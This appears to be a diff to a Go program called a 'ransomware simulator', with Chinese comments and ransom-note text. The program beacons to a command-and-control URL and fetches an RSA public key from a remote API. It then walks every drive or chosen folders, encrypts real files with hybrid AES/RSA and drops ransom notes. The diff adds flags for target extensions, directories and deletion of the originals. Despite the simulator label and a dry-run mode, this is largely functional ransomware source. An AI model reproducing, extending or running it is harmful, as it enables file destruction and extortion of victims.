@@ -7,7 +7,7 @@ import (
 	"crypto/rand"
 	"crypto/rsa"
 	"crypto/sha256"
-	"crypto/x509" // 修正笔误
+	"crypto/x509"
 	"encoding/json"
 	"encoding/pem"
 	"flag"
@@ -27,12 +27,11 @@ import (
 )
 
 // --- 勒索软件特征常量 ---
-const VERSION = "v2.0-RansomSimulator-CrossPlatform" // 更新版本号
+const VERSION = "v2.0-RansomSimulator-CrossPlatform"
 const API_URL = "https://rsa-uuid.api.yangzifun.org"
 const BEACON_URL = "http://bad-c2-server.api.yangzifun.org/beacon_check_in"
-const MUTEX_NAME = "Global\\{RansomSimulator-Mutex-f8d1e0a2}" // Windows 命名互斥锁
 
-// --- [中文] 更新勒索信内容 ---
+// --- 勒索信内容 ---
 const RANSOM_NOTE_CONTENT = `
 ========================= [ 你的所有文件都已被锁定! ] =========================
 
@@ -54,7 +53,7 @@ AES-256 + RSA-2048 加密。
 `
 
 var (
-	lockFilePath       string // lockFilePath 仅在非 Windows 系统中使用
+	lockFilePath       string
 	ransomNoteFileName = "!!!_如何解密你的文件_!!!.txt"
 	excludedDirs       = []string{
 		"/bin", "/boot", "/dev", "/etc", "/lib", "/lib64", "/proc", "/run", "/sbin", "/sys", "/usr", "/var",
@@ -105,9 +104,8 @@ func main() {
 	fmt.Println("成功.")
 	defer cleanupLockFile()
 
-	// ... 从这里开始，main 函数的其余部分与之前完全相同 ...
 	fs := flag.NewFlagSet("ransom_simulator", flag.ExitOnError)
-	workersFlag, dryRunFlag := setupFlags(fs)
+	workersFlag, dryRunFlag, extensionsFlag, directoryFlag, removeFlag := setupFlags(fs)
 	fs.Parse(os.Args[1:])
 
 	showWarning(*dryRunFlag)
@@ -121,13 +119,42 @@ func main() {
 		simulateDestructiveActions()
 	}
 
+	// 处理扩展名参数
 	extFilter := make(map[string]bool)
-	for _, ext := range targetExtensions {
-		extFilter[ext] = true
+	if *extensionsFlag != "" {
+		exts := strings.Split(*extensionsFlag, ",")
+		for _, ext := range exts {
+			ext = strings.TrimSpace(ext)
+			if ext != "" {
+				if !strings.HasPrefix(ext, ".") {
+					ext = "." + ext
+				}
+				extFilter[strings.ToLower(ext)] = true
+			}
+		}
+		fmt.Printf("[*] 使用指定的扩展名: %v\n", getKeys(extFilter))
+	} else {
+		for _, ext := range targetExtensions {
+			extFilter[ext] = true
+		}
+		fmt.Println("[*] 使用默认扩展名")
+	}
+
+	// 处理目录参数
+	var scanRoots []string
+	if *directoryFlag != "" {
+		dirs := strings.Split(*directoryFlag, ",")
+		for _, dir := range dirs {
+			dir = strings.TrimSpace(dir)
+			if dir != "" {
+				scanRoots = append(scanRoots, dir)
+			}
+		}
+		fmt.Printf("[*] 扫描指定目录: %v\n", scanRoots)
 	}
 
 	fmt.Println("[*] 正在扫描文件系统以查找有价值的目标...")
-	filesToProcess := scanFiles(extFilter)
+	filesToProcess := scanFiles(extFilter, scanRoots)
 	if len(filesToProcess) == 0 {
 		fmt.Println("[!] 未找到任何有价值的目标文件。任务中止。")
 		os.Exit(0)
@@ -146,7 +173,7 @@ func main() {
 	} else {
 		fmt.Println("\n[阶段 3: 载荷部署]")
 		fmt.Printf("[*] 初始化 %d 个加密线程。开始执行载荷...\n", *workersFlag)
-		runEncryptionWorkers(filesToProcess, *workersFlag, &stats, &finalUUID)
+		runEncryptionWorkers(filesToProcess, *workersFlag, &stats, &finalUUID, *removeFlag)
 		fmt.Println("\n[+] 载荷执行完毕。")
 	}
 
@@ -177,16 +204,45 @@ func main() {
 	countdown("此终端将在", 10)
 }
 
+// --- 锁机制实现 (修复了 undefined 错误) ---
+
+func createSingleInstanceLock() bool {
+	var err error
+	lockFilePath = filepath.Join(os.TempDir(), "ransom_simulator_instance.lock")
+
+	// O_EXCL 确保如果文件已存在则创建失败，实现单例锁
+	var file *os.File
+	file, err = os.OpenFile(lockFilePath, os.O_CREATE|os.O_EXCL, 0666)
+	if err != nil {
+		return false
+	}
+	file.Close()
+	return true
+}
+
+func cleanupLockFile() {
+	if lockFilePath != "" {
+		os.Remove(lockFilePath)
+	}
+}
+
 // --- 平台无关的辅助函数 ---
 
-func setupFlags(fs *flag.FlagSet) (*int, *bool) {
+func setupFlags(fs *flag.FlagSet) (*int, *bool, *string, *string, *bool) {
 	workers := fs.Int("workers", runtime.NumCPU(), "可选：并发 worker 数量 (默认: CPU核心数)")
 	dryRun := fs.Bool("dry-run", false, "可选：演习模式，只查找不加密")
+	extensions := fs.String("ext", "", "可选：指定要加密的文件扩展名，多个用逗号分隔（如：.txt,.doc,.pdf）")
+	directory := fs.String("dir", "", "可选：指定要加密的目录，多个用逗号分隔")
+	removeOriginal := fs.Bool("remove", false, "可选：加密后删除原文件")
+
 	fs.Usage = func() {
-		fmt.Fprintf(os.Stderr, "用法: %s [-workers N] [-dry-run]\n", os.Args[0])
+		fmt.Fprintf(os.Stderr, "用法: %s [-workers N] [-dry-run] [-ext extensions] [-dir directories] [-remove]\n", os.Args[0])
+		fmt.Fprintf(os.Stderr, "示例:\n")
+		fmt.Fprintf(os.Stderr, "  %s -ext .txt,.doc -dir C:\\Users\\Test,D:\\Data -remove\n", os.Args[0])
+		fmt.Fprintf(os.Stderr, "  %s -dry-run -ext .pdf\n", os.Args[0])
 		fs.PrintDefaults()
 	}
-	return workers, dryRun
+	return workers, dryRun, extensions, directory, removeOriginal
 }
 
 func showWarning(dryRun bool) {
@@ -220,13 +276,6 @@ func networkBeacon() {
 		fmt.Printf("[IOC] C2信标: 成功连接到 %s。\n", BEACON_URL)
 	}
 }
-
-// ... 此处省略大量未做修改的函数 ...
-// ... dropRansomNotes, createRansomWallpaper ...
-// ... scanFiles, runEncryptionWorkers, worker, fetchKeysFromAPI ...
-// ... isExcluded, shouldEncrypt, getUserDirs, getDesktopPath ...
-// ... processFile, hybridEncrypt, newFileLog, Log, Close ...
-// ... 粘贴下面的完整代码块即可 ...
 
 func simulateDestructiveActions() {
 	time.Sleep(1 * time.Second)
@@ -307,18 +356,25 @@ func createRansomWallpaper() {
 	fmt.Printf("  - 模拟: 执行命令 (并未实际运行): %s\n", cmd)
 }
 
-func scanFiles(extFilter map[string]bool) []string {
+func scanFiles(extFilter map[string]bool, scanRoots []string) []string {
 	var filesToProcess []string
-	roots := []string{"/"}
-	if runtime.GOOS == "windows" {
-		roots = []string{}
-		for _, drive := range "ABCDEFGHIJKLMNOPQRSTUVWXYZ" {
-			drivePath := string(drive) + ":\\"
-			if _, err := os.Stat(drivePath); err == nil {
-				roots = append(roots, drivePath)
+	var roots []string
+
+	if len(scanRoots) > 0 {
+		roots = scanRoots
+	} else {
+		roots = []string{"/"}
+		if runtime.GOOS == "windows" {
+			roots = []string{}
+			for _, drive := range "ABCDEFGHIJKLMNOPQRSTUVWXYZ" {
+				drivePath := string(drive) + ":\\"
+				if _, err := os.Stat(drivePath); err == nil {
+					roots = append(roots, drivePath)
+				}
 			}
 		}
 	}
+
 	for _, root := range roots {
 		filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
 			if err != nil {
@@ -339,7 +395,7 @@ func scanFiles(extFilter map[string]bool) []string {
 	return filesToProcess
 }
 
-func runEncryptionWorkers(files []string, numWorkers int, stats *counters, outUUID *string) {
+func runEncryptionWorkers(files []string, numWorkers int, stats *counters, outUUID *string, removeOriginal bool) {
 	jobs := make(chan string, len(files))
 	var wg sync.WaitGroup
 
@@ -365,7 +421,7 @@ func runEncryptionWorkers(files []string, numWorkers int, stats *counters, outUU
 
 	for w := 0; w < numWorkers; w++ {
 		wg.Add(1)
-		go worker(w+1, jobs, &wg, stats, log, resp)
+		go worker(w+1, jobs, &wg, stats, log, resp, removeOriginal)
 	}
 
 	for _, file := range files {
@@ -398,10 +454,10 @@ func runEncryptionWorkers(files []string, numWorkers int, stats *counters, outUU
 	fmt.Printf("\r[*] 加密完成。 [100.00%%] (%d/%d) \n", totalFiles, totalFiles)
 }
 
-func worker(id int, jobs <-chan string, wg *sync.WaitGroup, stats *counters, log *fileLog, apiResp *APIResponse) {
+func worker(id int, jobs <-chan string, wg *sync.WaitGroup, stats *counters, log *fileLog, apiResp *APIResponse, removeOriginal bool) {
 	defer wg.Done()
 	for file := range jobs {
-		err := processFile(file, apiResp.PublicKeyPEM)
+		err := processFile(file, apiResp.PublicKeyPEM, removeOriginal)
 		if err != nil {
 			stats.failed.Add(1)
 		} else {
@@ -478,6 +534,14 @@ func getUserDirs() []string {
 	return []string{home}
 }
 
+func getKeys(m map[string]bool) []string {
+	keys := make([]string, 0, len(m))
+	for k := range m {
+		keys = append(keys, k)
+	}
+	return keys
+}
+
 func getDesktopPath() string {
 	home, err := os.UserHomeDir()
 	if err != nil {
@@ -496,16 +560,36 @@ func getDesktopPath() string {
 	}
 }
 
-func processFile(filePath string, publicKeyStr string) error {
+func processFile(filePath string, publicKeyStr string, removeOriginal bool) error {
 	content, err := os.ReadFile(filePath)
 	if err != nil {
 		return err
 	}
+
 	encryptedContent, err := hybridEncrypt(content, publicKeyStr)
 	if err != nil {
 		return err
 	}
-	return os.WriteFile(filePath, encryptedContent, 0644)
+
+	encryptedFilePath := filePath + ".encrypted"
+
+	err = os.WriteFile(encryptedFilePath, encryptedContent, 0644)
+	if err != nil {
+		return err
+	}
+
+	if removeOriginal {
+		err = os.Remove(filePath)
+		if err != nil {
+			fmt.Printf("[!] 无法删除原文件 %s: %v\n", filePath, err)
+		} else {
+			fmt.Printf("[*] 文件已加密，原文件已删除: %s -> %s\n", filePath, encryptedFilePath)
+		}
+	} else {
+		fmt.Printf("[*] 文件已加密，保留原文件: %s -> %s\n", filePath, encryptedFilePath)
+	}
+
+	return nil
 }
 
 func hybridEncrypt(plaintext []byte, publicKeyStr string) ([]byte, error) {
